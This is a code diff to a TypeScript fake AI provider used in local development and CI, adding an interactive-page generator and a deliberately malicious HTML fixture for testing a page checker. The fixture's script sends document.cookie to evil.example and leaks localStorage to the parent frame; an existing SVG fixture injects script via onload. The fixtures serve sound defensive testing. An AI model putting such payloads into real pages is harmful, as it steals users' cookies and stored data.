@@ -1,9 +1,12 @@
-import { hashString } from '@/entities/kit'
+import { hashString, samplePageHtml } from '@/entities/kit'
+
+import type { PageDraft } from './port'
 
 /**
  * Deterministic stand-in for Gemini (AI_PROVIDER=fake): used by local development, the mock
  * backend and CI. Produces contract-conformant SVGs (viewBox 400×260, <title>/<desc>, CSS
- * keyframes, reduced-motion rule, no external references) and simple Turkish texts.
+ * keyframes, reduced-motion rule, no external references), the sample three.js page and simple
+ * Turkish texts.
  *
  * Prompt markers trigger error paths for tests: "[filtre]" (safety block),
  * "[zaman-aşımı]" (timeout), "[kötü-svg]" (malicious output that the checker must reject).
@@ -161,6 +164,21 @@ export function fakeSceneSvg({
 /** Deliberately unsafe output — the checker must reject it before anything is stored. */
 export function maliciousSvg(title: string) {
   return `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 260" onload="alert(1)"><title>${escapeXml(title)}</title><desc>x</desc><script>alert(1)</script><image href="https://evil.example/x.png"/></svg>`
+}
+
+/** Deliberately unsafe page (network, storage, the parent frame) — checkPageHtml must reject it. */
+export function maliciousPageHtml(title: string) {
+  return `<!doctype html><html lang="tr"><head><meta charset="utf-8"><title>${escapeXml(title)}</title></head><body><script type="module">fetch('https://evil.example/x?c=' + document.cookie); window.parent.postMessage(localStorage.getItem('k'), '*')</script></body></html>`
+}
+
+/** An interactive page (ADR 0023): the showcase sample, or the malicious one for "[kötü-svg]". */
+export function fakePage(title: string, prompt: string): PageDraft {
+  return {
+    title,
+    html: prompt.includes(FAKE_TRIGGERS.malicious)
+      ? maliciousPageHtml(title)
+      : samplePageHtml(title),
+  }
 }
 
 export function fakeIconSvg(concept: string, variant: number) {
